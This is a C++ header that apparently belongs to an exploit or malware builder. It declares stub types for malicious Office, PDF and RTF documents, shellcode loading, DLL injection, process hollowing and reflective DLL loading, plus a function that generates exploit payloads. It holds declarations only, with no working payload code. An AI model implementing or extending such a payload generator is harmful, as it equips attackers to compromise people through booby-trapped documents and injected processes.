#ifndef STUB_TYPES_H
#define STUB_TYPES_H

#include <vector>
#include <string>
#include <cstdint>

/**
 * @brief Enumeration of different exploit stub types
 */
enum class StubType {
    XLL_EXPLOIT,        // Excel XLL add-in exploit
    DOC_XLS_EXPLOIT,    // Office document exploit (Word/Excel)
    PDF_EXPLOIT,        // PDF document exploit
    RTF_EXPLOIT,        // Rich Text Format exploit
    PE_INJECTION,       // PE file injection exploit
    SHELLCODE_LOADER,   // Shellcode loader stub
    DLL_INJECTION,      // DLL injection stub
    PROCESS_HOLLOWING,  // Process hollowing stub
    REFLECTIVE_DLL,     // Reflective DLL loading
    CUSTOM_PAYLOAD      // Custom payload stub
};

/**
 * @brief Generates exploit payload based on the specified stub type
 * 
 * @param stubType The type of exploit stub to generate
 * @param targetPath Optional target file path for file-based exploits
 * @param customParams Optional custom parameters for the payload
 * @return std::vector<uint8_t> Generated payload bytes
 */
std::vector<uint8_t> generate_exploit_payload(
    StubType stubType,
    const std::string& targetPath = "",
    const std::vector<uint8_t>& customParams = {}
);

/**
 * @brief Gets a human-readable name for the stub type
 * 
 * @param stubType The stub type to get the name for
 * @return std::string The name of the stub type
 */
std::string get_stub_type_name(StubType stubType);

/**
 * @brief Checks if a stub type requires a target file
 * 
 * @param stubType The stub type to check
 * @return true if the stub type requires a target file, false otherwise
 */
bool requires_target_file(StubType stubType);

#endif // STUB_TYPES_H